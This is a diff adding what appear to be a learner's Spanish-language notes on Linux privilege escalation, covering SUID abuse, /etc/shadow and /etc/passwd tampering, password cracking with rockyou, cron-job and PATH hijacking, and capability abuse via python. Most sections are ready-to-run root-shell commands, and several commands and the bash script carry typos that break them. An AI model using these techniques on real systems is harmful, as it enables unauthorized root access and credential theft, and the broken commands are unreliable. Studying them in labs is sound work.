@@ -1,0 +1,102 @@
+Explotacion de permisos SUID:
+	1. Para anadir permiso SUID se le debe de anadir un 4 al pricipio de los premiso otorcados. Ejemplo: Si tenemos el archivo find.
+		a. Which find
+		b. Which find | xargs ls -l # con este comando puedo ver los persimo de dicho archivo.
+		c. Chmod 4755 /usr/bin/find
+		d. Which find | xargs ls -l
+		e. -rwsr-x-r-x 1 root root 345563 sep 1 2020 /usr/bin/find # ya este permiso tiene SUID
+	2. Recurso: 
+		a. Pagina: https://gtfobins.github.io/
+		b. Comando de explotacion: find . -exec /bin/sh -p \; -quit
+	3. Ver el usario:
+		a. Comando: uname -a
+		b. Ver el kernel comando: lsb_release -a
+	4. Buscar privilegio SUID:
+		a. Comando: find \-perm -4000 2>/dev/null
+		b. Comando para eliminar los mensaje de error: 2>/dev/null
+	5. Buscar ruta con privilegio de escritura:
+		a. Comando: find \-writable 2>/dev/null
+	6. Las contrasena se encripta a traves una metodo
+		a. Ruta donde se encuentra la constrasena encriptada: cat /etc/login.defs | grep "ENCRYPT_METHOD"
+		b. Ejemplo:
+		c. Cat /etc/shadow | grep pepito
+	7. Dicionatrio comun de contrasena:
+		a. Ruta: /usr/share/wordlist/rockyou.txt
+		b. Ejemplo: cat rockyou.txt | grep "^pepito$" -n # con este comando buscamos explicitamente con la plabra y en numero de linea que se encuentra.
+	8. Crear contrasena de tipo DES(Unix):
+		a. Comando: openssl passwd
+		b. Proporcionar contrasena
+	9. Herramienta para saber que tipo de contrasena esta tratando:
+		a. Hash-identifier
+		b. Le proporciona el hash de la contrasena
+		c. Hashid <hash>
+	10. Tips: Si tiene capacita de escritura en /etc/passwd, puede proporcionar una contrasena cambiando la X por el hash prevamendo creado. 
+		a. Ejemplo: root:<hash>:0:0:root # no le das oportunidad que no lea la X para que la compare con el shadow y compara el hash, si no que lo esfuera a usa el hash de la contrasena creada como atacande, atraves de un DES(Unix).
+		b. Es importante que los permiso este bien asignados. 
+		
+
+Explotacion de tareas CRON:
+	1. Enumeroacion de usarios
+		a. Comando id: # enumera el usario para ver si tiene algun tipo de privilegio. 
+		b. Comando sudo -l # para ver que tipo de privigecion tiene el usario, fuera de lo normal  o permiso especial. 
+	2. Creacion de script en bash:
+		a. Crear un archivo con nombre descriptivo. 
+			Codigo:
+			#!/bin/bash
+			
+			Old_process=$(ps -eo command)
+			
+			While true; do 
+				New_process=$(ps -eo command)
+				Diff <(echo "$old_process") <(echo "$new_proccess) | grep "[\>\<]" | grep -v "kworker"
+				Old_proccess=$new_process
+			done
+	3. Si encuentre una ruta cron que pondencialmente puede hacer escritura, lectura o ejecucion. Se parasaria a ese directorio y combiaria la ejecucion que se esta realizado por una nueva ejecucion con permiso SUID. 
+		a. Comando de modificaicon:
+			i. Chmod 4755 /bin/bash
+		b. Para monotorisar la ejecucion del script
+			i. Comando seria: 
+			ii. Watch -n 1 ls -l /bin/bash
+		c. Para que nos atencia como owner de ese SUID se le debe de asignar una flag que seria -p 
+			i. Comando: 
+			ii. Bash -p
+
+Explotacion de PATH Hijacking
+	1. Ejercicio de practica: 
+		a. Codigo en c 
+		include <stdio.h>
+		
+		void main() 
+		{
+		   setuid(0);
+		
+		   printf("\n\n[*] Listando el proceso (/usr/bin/ps):\n\n"); 
+		   system("/usr/bin/ps");
+		
+		   printf("\n\n[*] Listando el proceso (ps):\n\n");
+		   system("ps");
+		
+		}
+	2. Atraves de la utilidad "export" podemos alterarl una variable. 
+		a. Ejemplo:
+		b. Export PATH=.:$PATH
+	3. Atraves de la cadena "strings" podemos listar las cadena imprimible de un binario aunque ese se encuenrte compilado. 
+	4. Procedimiento del Path hackjaking
+		a. Creacion de archivo, ejemplo "ps"
+		b. Asigna privilegio de ejecucion, ejemplo "chmod +x ps"
+		c. Abir el archivo y escribir el comando que desea ejecutar. Ejemplo "bash -p"
+		d. Alteral el PATH, ejemplo "export PATH=/tmp:$PATH"
+		
+Explotacion de las Capabilities en linux:
+	1. Comando para ver las capabilities:
+		a. Getcap -r 2>/dev/null
+	2. Utilizando las capabilities puedo asignarle como que tipo quiero operar. Ejemp: "/usr/bin/python3.8 = cap_setuid+ep" # python tiene una capabilite de tipo SUID
+	3. El atacande se puede aprovechar de este capabilities para escalar privilegio. 
+		a. Ejmp: python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+	4. Como asignar y remover capabilites:
+		a. Para asginar una cpabilities de tipo SUID
+			i. Comando: setcap cap_setuid+ep <ruta> "/usr/bin/python3.8"
+		b. Como ver que capabilities tiene el sistema:
+			i. Comando: getcap <ruta> "/usr/bin/python3.8"
+		c. Como revover el capabilities del sistema:
+Comando: setcap -r <ruta> "/usr/bin/python3.8"
